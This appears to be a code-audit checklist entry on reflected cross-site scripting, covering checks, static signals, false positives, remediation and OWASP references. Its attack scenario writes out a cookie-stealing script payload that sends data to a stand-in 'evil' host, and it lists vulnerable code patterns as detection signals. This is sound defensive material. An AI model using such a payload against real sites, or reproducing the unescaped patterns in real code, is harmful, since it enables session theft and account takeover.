---
id: P38
name: ReflectedXSS
refs: ASVS V5.3.x / WSTG-INPV-01, WSTG-INPV-02 / CS: Cross Site Scripting Prevention, DOM based XSS Prevention
requires: [backend]
---

# P38 — Reflected XSS

## Overview
Reflected Cross-Site Scripting (XSS) occurs when request-controlled input — query string, path parameter, request body, or header — is echoed back into an HTML response **without context-correct encoding or sanitization**. The payload is not persisted (unlike stored XSS), so the victim must be induced to follow a crafted link (phishing email, malicious page with an auto-submitting form, embedded iframe). The root cause is always the same: untrusted data reaches an output sink (HTML body, attribute, JavaScript string, URL, or CSS) through a code path that does not encode for *that* context. A single generic "escape everything" helper is rarely safe across contexts.

## What to check
- Does any handler write request-derived data (`req.query`, `req.params`, `req.body`, `req.headers`, `req.path`) directly into an HTML response body?
- Is the **output context** matched to the right encoder? HTML body → HTML-encode; attribute → attribute-encode; inside `<script>` → JS-string-encode; in `href`/`src` → URL-encode. HTML-escaping is insufficient inside a JS string or a `javascript:` URL.
- Has the template engine's auto-escaping been explicitly disabled — EJS `<%- %>`, Pug `!=`, React `dangerouslySetInnerHTML`, Vue `v-html`, Django/Jinja `{% autoescape off %}` or `|safe`, Go `text/template` instead of `html/template`, PHP `echo $_GET[...]` without `htmlspecialchars`?
- Is a reflected value interpolated into an event handler (`onclick="f('<%= q %>')"`), a `<script>` block, or a `href`/`src` attribute where HTML-encoding alone allows breakout?
- Does the endpoint reflect input with `Content-Type: text/html` even though the data is not HTML?
- Are reflected values later consumed by the client via `innerHTML`/`v-html` (then see P40 — DOM XSS)?

## Static signals
String concatenation / interpolation into HTML:
- `res.send('<h1>' + req.query.q + '</h1>')`
- `res.write(\`Hi ${req.params.name}\`)`
- Python: `f"<div>{q}</div>"`, `"<div>{}</div>".format(q)`, `"<div>%s</div>" % q`
- Java/JSP: `out.print("<h1>" + q + "</h1>")`, `<%= q %>` (scriptlet, unescaped)

Escaping disabled in templates:
- EJS `<%- q %>` (unescaped) vs `<%= q %>` (escaped)
- React `dangerouslySetInnerHTML={{ __html: q }}`
- Vue `v-html="q"`; Svelte `{@html q}`
- Django/Jinja `{% autoescape off %}`, `{{ q|safe }}`
- Go: `text/template` (NOT auto-escaped) vs `html/template` (escaped by default)

Reflected into non-body contexts (HTML-escape insufficient):
- `<a href="<%= q %>">...</a>` (attribute/URL)
- `<script>var x = '<%= q %>';</script>` (JS context)
- `<img src=x onerror="<%= q %>">` (event handler)

## False positives
- Framework auto-escaping is enabled and was not disabled for that output (EJS `<%=%>`, React `{}`, Angular `{{}}`, Django autoescape on, Go `html/template`). Confirm the context matches the encoder.
- The endpoint returns JSON with `Content-Type: application/json; charset=utf-8` and the client treats it as data (not injected via `innerHTML`). JSON-encoding is sufficient there.
- Input was validated against a strict allow-list (UUID, integer, enum) before reflection — it cannot carry markup.
- The value originates from a trusted, server-generated source, not the request.

## Attack scenario
1. Attacker crafts `https://app.example.com/search?q=<script>fetch('//evil/?c='+document.cookie)</script>`.
2. Victim follows the link via phishing email or a page embedding an auto-submitting form / hidden iframe.
3. The server reflects `q` unescaped into the results page; the `<script>` executes in the victim's authenticated session.
4. The attacker exfiltrates the session cookie / CSRF token, performs actions as the victim, or defaces the page.

## Impact
- **Confidentiality**: session/token theft, leakage of DOM data.
- **Integrity**: arbitrary script execution in the victim's context — account takeover, fraudulent transactions.
- **Availability**: defacement, forced redirect to malware.
- Severity scales with the victim's privileges: an admin-level reflected XSS can become full application compromise.

## Remediation
Prefer framework auto-escaping; never concatenate HTML by hand:
```ts
// VULNERABLE — string concatenation into HTML
app.get('/search', (req, res) => res.send(`<h1>Results for ${req.query.q}</h1>`));

// SAFE — auto-escaping template
app.get('/search', (req, res) => res.render('search', { q: req.query.q }));
```
For attribute, URL, or JS-string contexts use a context-aware encoder (framework-provided, or DOMPurify for rich HTML). Add a strict Content Security Policy (`script-src 'self'` plus nonces/hashes) as defense-in-depth — it caps the blast radius if an encoding bug slips through.

## References
- OWASP ASVS V5.3.x — Output encoding and injection prevention
- OWASP WSTG-INPV-01, WSTG-INPV-02 — Testing for reflected / stored XSS
- OWASP Cheat Sheets: Cross Site Scripting Prevention, DOM based XSS Prevention, Content Security Policy
